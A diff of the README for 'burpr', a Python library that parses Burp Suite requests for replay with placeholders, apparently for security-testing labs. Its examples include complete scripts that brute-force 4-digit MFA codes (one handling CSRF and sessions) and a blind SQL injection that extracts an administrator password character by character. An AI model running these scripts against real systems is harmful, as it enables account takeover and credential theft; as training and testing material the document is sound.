@@ -6,57 +6,108 @@
 A Burp Suite request parser, used for aid in assessing application security functionality.
 
 # Why I wrote it
-To use Burp Suite captured requests without relying on intruder.
+To use captured requests programatically.
 
 # Installation
-```
+```bash
 pip install burpr
 ```
 
 # Usage
-Use burpr.py module to parse the Burp Suite copied request. Then use the created object to extract headers and body.
-
-Supports parsing requests as strings and as .txt files.
+Parse Burp requests from strings or files. Use the `.bind()` method to replace placeholder values.
 
 ```python
 import burpr
 
-# Load from string
-req = burpr.parse_string(req_string)
+# Parse from string
+burp_request = '''GET /api/users HTTP/2
+Host: example.com
+Authorization: Bearer %TOKEN%
 
-# Load from file
-req = burpr.parse_file(req_file_path)
+'''
 
-# clone the request
-req_clone = burpr.clone(req)
+req = burpr.parse_string(burp_request)
+req.bind("%TOKEN%", "actual-token-value")
 
-# change protocol to http1.1
-req_clone.set_protocol(burpr.protocols.HTTP1_1)
+# Method 1: Using requests library
+response = req.make_request()
 
-# change transport to http
-req_clone.set_transport(burpr.transports.HTTP)
+# Method 2: Using httpx for HTTP/2 support
+response = req.make_httpx_request()
 
-# modify the header
-req_clone.set_header("Cookie", "session=modified_session_cookie")
+# Method 3: Manual with any HTTP client
+import httpx
+client = httpx.Client(http2=req.is_http2)
+response = client.request(
+    method=req.method,
+    url=req.url,
+    headers=req.headers,
+    content=req.body
+)
+```
 
-# modify the parameter
-req_clone.set_parameter("post-param", "AAABBBCCC")
+# Features
 
-# remove parameter
-req_clone.remove_parameter("post-param")
+## Comprehensive Parsing Support
+```python
+# Parse Burp Suite requests
+req = burpr.parse_string(burp_request_string)
+req = burpr.parse_file("request.txt")
 
-# remove header
-req_clone.remove_header("Cookie")
+# Parse curl commands
+req = burpr.from_curl('curl -X POST https://api.com/data -d "key=%VALUE%"')
 
-# adjust Content-Length for parameter change
-burpr.prepare(req_clone)
+# Parse from Python requests
+req = burpr.from_requests("POST", "https://api.com", json={"key": "%VALUE%"})
 
-client = httpx.Client(http2=True)
-res = client.post(req.url, headers=req.headers, data=req.body)
+# Parse HTTP/2 requests
+req = burpr.from_http2({
+    ":method": "GET",
+    ":path": "/users",
+    ":authority": "api.example.com",
+    ":scheme": "https"
+})
+```
+
+## Placeholder System
+```python
+# Use %PLACEHOLDER% format for dynamic values
+req.bind("%TOKEN%", "actual-token-value")
+req.bind("%USER_ID%", "12345")
+
+# Chain multiple bindings
+req.bind("%HOST%", "prod.api.com") \
+   .bind("%VERSION%", "v2") \
+   .bind("%KEY%", "secret")
+```
+
+## Making Requests
+```python
+# Method 1: Direct execution with requests library
+response = req.make_request()
+
+# Method 2: Using httpx for HTTP/2 support
+response = req.make_httpx_request()
+
+# Method 3: Get prepared request for custom handling
+prepared = req.to_request()  # returns requests.PreparedRequest
+```
+
+## Utility Functions
+```python
+# Clone a request
+req2 = burpr.clone(req)
+
+# Set Content-Length
+burpr.prepare(req)
+
+# Convert back to Burp format
+burp_string = burpr.to_burp_format(req)
 ```
 
 # Examples
-## Brute force broken MFA
+
+## Brute Force Broken MFA
 ```python
 import burpr
 import httpx
@@ -83,119 +134,150 @@ Referer: https://xxxx.web-security-academy.net/login2
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 
-mfa-code=4321
+mfa-code=%MFA_CODE%
 """
 
 def generate_pin_numbers():
-  return [''.join(list([str(digit) for digit in permutation])) 
-          for permutation in itertools.product(list(range(0, 10)), repeat=4)]
+    return [''.join(str(d) for d in combo) for combo in itertools.product(range(10), repeat=4)]
 
 def brute_force_broken_mfa():
-  # Parse request from string
-  req = burpr.parse_string(burp_request)
-
-  # Create http client and check the protocol used
-  client = httpx.Client(http2=req.is_http2)
-
-  for pin in generate_pin_numbers():
-    # Modify the mfa-code parameter
-    req.set_parameter("mfa-code", pin)
-
-    # Send the request
-    res = client.post(req.url, headers=req.headers, data=req.body)
-
-    print(res.status_code, pin)
+    # Parse base request
+    base_req = burpr.parse_string(burp_request)
     
-    if (res.status_code != 200):
-      break
+    # Create http client
+    client = httpx.Client(http2=base_req.is_http2)
+    
+    for pin in generate_pin_numbers():
+        # Clone and bind the PIN
+        req = burpr.clone(base_req)
+        req.bind("%MFA_CODE%", pin)
+        burpr.prepare(req)
+        
+        # Send request
+        res = client.request(
+            method=req.method,
+            url=req.url,
+            headers=req.headers,
+            content=req.body
+        )
+        
+        print(res.status_code, pin)
+        
+        if res.status_code != 200:
+            break
 
 brute_force_broken_mfa()
 ```
 
-## Brute force stricter broken MFA
+## Brute Force Stricter Broken MFA
 ```python
 import burpr
 import httpx 
 from bs4 import BeautifulSoup
 import itertools
 
-
 def generate_pin_numbers():
-  return [''.join(list([str(digit) for digit in permutation])) 
-          for permutation in itertools.product(list(range(0, 10)), repeat=4)]
+    return [''.join(str(d) for d in combo) for combo in itertools.product(range(10), repeat=4)]
 
 def brute_force_stricter_broken_mfa():
-    victim_login = "xxx"
-    victim_pass = "xxx"
+    # Templates with placeholders
+    login_get_template = '''GET /login HTTP/1.1
+Host: xxxx.web-security-academy.net
 
-    burp_login_get = burpr.parse_file("./login-get.txt")
-    burp_login_post  = burpr.parse_file("./login-post.txt")
-    burp_login_mfa_get = burpr.parse_file("./login-mfa-get.txt")
-    burp_login_mfa_post = burpr.parse_file("./login-mfa-post.txt")
+'''
+    
+    login_post_template = '''POST /login HTTP/1.1
+Host: xxxx.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Cookie: %SESSION%
 
-    client = httpx.Client(http2=True)
+csrf=%CSRF%&username=%USERNAME%&password=%PASSWORD%
+'''
+    
+    mfa_get_template = '''GET /login2 HTTP/1.1
+Host: xxxx.web-security-academy.net
+Cookie: %SESSION%
 
+'''
+    
+    mfa_post_template = '''POST /login2 HTTP/1.1
+Host: xxxx.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Cookie: %SESSION%
+
+csrf=%CSRF%&mfa-code=%MFA_CODE%
+'''
+    
+    victim_login = "carlos"
+    victim_pass = "montoya"
+    
+    client = httpx.Client()
+    
     for pin in generate_pin_numbers():
-        # Get CSRF token and session
-        req = burpr.clone(burp_login_get)
-
-        res = client.get(req.url, headers=req.headers)
+        # Get CSRF token
+        req = burpr.parse_string(login_get_template)
+        res = client.request(req.method, req.url, headers=req.headers)
         
-        soup = BeautifulSoup(res, "html.parser")
-        session = res.headers.get("set-cookie")
+        soup = BeautifulSoup(res.text, "html.parser")
         csrf = soup.find(attrs={"name": "csrf"})["value"]
-
-        # Log in
-        req = burpr.clone(burp_login_post)
-
-        req.set_header("Cookie", session)
-        req.set_parameter("csrf", csrf)
-        req.set_parameter("username", victim_login),
-        req.set_parameter("password", victim_pass)
+        session = res.cookies.get("session")
+        
+        # Login
+        req = burpr.parse_string(login_post_template)
+        req.bind("%SESSION%", f"session={session}")
+        req.bind("%CSRF%", csrf)
+        req.bind("%USERNAME%", victim_login)
+        req.bind("%PASSWORD%", victim_pass)
         burpr.prepare(req)
-
-        res = client.post(req.url, headers=req.headers, data=req.body)
-
-        # Get CSRF token and session
-        req = burpr.clone(burp_login_mfa_get)
-
-        session = res.headers.get("set-cookie")
-        req.set_header("Cookie", session)
-        burpr.prepare(req)
-
-        res = client.get(req.url, headers=req.headers)
-        soup = BeautifulSoup(res, "html.parser")
+        
+        res = client.request(
+            method=req.method,
+            url=req.url,
+            headers=req.headers,
+            content=req.body
+        )
+        
+        # Get MFA page
+        session = res.cookies.get("session")
+        req = burpr.parse_string(mfa_get_template)
+        req.bind("%SESSION%", f"session={session}")
+        
+        res = client.request(req.method, req.url, headers=req.headers)
+        soup = BeautifulSoup(res.text, "html.parser")
         csrf = soup.find(attrs={"name": "csrf"})["value"]
-
-        # Attempt another MFA pin guess and start again
-        req = burpr.clone(burp_login_mfa_post)
-
-        req.set_header("Cookie", session)
-        req.set_parameter("csrf", csrf)
-        req.set_parameter("username", victim_login),
-        req.set_parameter("password", victim_pass)
-        req.set_parameter("mfa-code", pin)
+        
+        # Try MFA code
+        req = burpr.parse_string(mfa_post_template)
+        req.bind("%SESSION%", f"session={session}")
+        req.bind("%CSRF%", csrf)
+        req.bind("%MFA_CODE%", pin)
         burpr.prepare(req)
-
-        res = client.post(req.url, headers=req.headers, data=req.body)
-
+        
+        res = client.request(
+            method=req.method,
+            url=req.url,
+            headers=req.headers,
+            content=req.body
+        )
+        
         print(pin)
-
+        
         if res.status_code != 200:
-            print(res.status_code, pin, res.headers, res.text)
+            print(res.status_code, pin, res.headers)
             break
 
 brute_force_stricter_broken_mfa()
 ```
-## Blind SQL injection with conditional responses
-``` python
+
+## Blind SQL Injection with Conditional Responses
+```python
 import burpr
 import httpx
 import sys
 
-burp_req = r'''GET /filter?category=Gifts HTTP/2
+burp_request = '''GET /filter?category=Gifts HTTP/2
 Host: xxxx.web-security-academy.net
-Cookie: TrackingId=aaaabbbbbcccccdddddd; session=aaaabbbbbcccccdddddd
+Cookie: TrackingId=%TRACKING_ID%; session=aaaabbbbbcccccdddddd
 Sec-Ch-Ua: 
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: ""
@@ -208,38 +290,119 @@ Sec-Fetch-User: ?1
 Sec-Fetch-Dest: document
 Referer: https://xxxx.web-security-academy.net/
 Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9'''
+Accept-Language: en-US,en;q=0.9
+
+'''
 
 alphabet = "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_-+="
+base_tracking = "aaaabbbbbcccccdddddd"
 
-# determine password length
-req = burpr.parse_string(burp_req)
-client = httpx.Client(http2=True)
+# Parse base request
+base_req = burpr.parse_string(burp_request)
+client = httpx.Client(http2=base_req.is_http2)
 
+# Determine password length
 length = 0
 while length < 255:
-  payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={length + 1})='a"
-
-  req.set_header("Cookie", f"TrackingId=aaaabbbbbcccccdddddd{payload}; session=aaaabbbbbcccccdddddd")
-  res = client.get(req.url, headers=req.headers)
-  
-  length = length + 1
-
-  if "Welcome back" in res.text:
-    break
+    payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={length + 1})='a"
+    tracking_id = base_tracking + payload
+    
+    req = burpr.clone(base_req)
+    req.bind("%TRACKING_ID%", tracking_id)
+    
+    res = client.request(req.method, req.url, headers=req.headers)
+    
+    length = length + 1
+    
+    if "Welcome back" in res.text:
+        break
 
 print(f"[*] Password length is {length}, retrieving password:")
 
-# retrieve password
+# Retrieve password
 for i in range(length):
-  for letter in alphabet:
-    payload = f"' AND (SELECT SUBSTRING(password,{i + 1},1) FROM users WHERE username='administrator')='{letter}"
-
-    req.set_header("Cookie", f"TrackingId=aaaabbbbbcccccdddddd{payload}; session=aaaabbbbbcccccdddddd")
-    res = client.get(req.url, headers=req.headers)
-  
-    if "Welcome back" in res.text:
-      sys.stdout.write(letter)
-      sys.stdout.flush()
-      break
+    for letter in alphabet:
+        payload = f"' AND (SELECT SUBSTRING(password,{i + 1},1) FROM users WHERE username='administrator')='{letter}"
+        tracking_id = base_tracking + payload
+        
+        req = burpr.clone(base_req)
+        req.bind("%TRACKING_ID%", tracking_id)
+        
+        res = client.request(req.method, req.url, headers=req.headers)
+        
+        if "Welcome back" in res.text:
+            sys.stdout.write(letter)
+            sys.stdout.flush()
+            break
 ```
+
+## Using curl Commands
+```python
+import burpr
+import httpx
+
+# Parse curl command with placeholders
+curl_cmd = '''curl -X POST https://api.example.com/v2/authenticate \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: %API_KEY%" \
+  -d '{"username": "%USERNAME%", "password": "%PASSWORD%", "grant_type": "password"}'
+'''
+
+req = burpr.from_curl(curl_cmd)
+req.bind("%API_KEY%", "sk-1234567890")
+req.bind("%USERNAME%", "testuser")
+req.bind("%PASSWORD%", "testpass123")
+
+client = httpx.Client()
+response = client.request(
+    method=req.method,
+    url=req.url,
+    headers=req.headers,
+    content=req.body
+)
+```
+
+## Request Builder Pattern
+```python
+import burpr
+
+# Create a template with multiple placeholders
+api_template = '''%METHOD% %ENDPOINT% HTTP/1.1
+Host: %HOST%
+Authorization: Bearer %TOKEN%
+Content-Type: %CONTENT_TYPE%
+X-Request-ID: %REQUEST_ID%
+
+%BODY%
+'''
+
+# Build different requests from the same template
+def create_api_request(method, endpoint, body="", content_type="application/json"):
+    req = burpr.parse_string(api_template)
+    req.bind("%METHOD%", method)
+    req.bind("%ENDPOINT%", endpoint)
+    req.bind("%HOST%", "api.production.com")
+    req.bind("%TOKEN%", get_current_token())
+    req.bind("%CONTENT_TYPE%", content_type)
+    req.bind("%REQUEST_ID%", generate_request_id())
+    req.bind("%BODY%", body)
+    
+    burpr.prepare(req)
+    return req
+
+# Use it
+req1 = create_api_request("GET", "/api/users")
+req2 = create_api_request("POST", "/api/users", '{"name": "John"}')
+req3 = create_api_request("DELETE", "/api/users/123")
+```
+
+# Testing
+
+Run tests with pytest:
+```bash
+pytest tests/ -v
+```
+
+# License
+
+MIT License
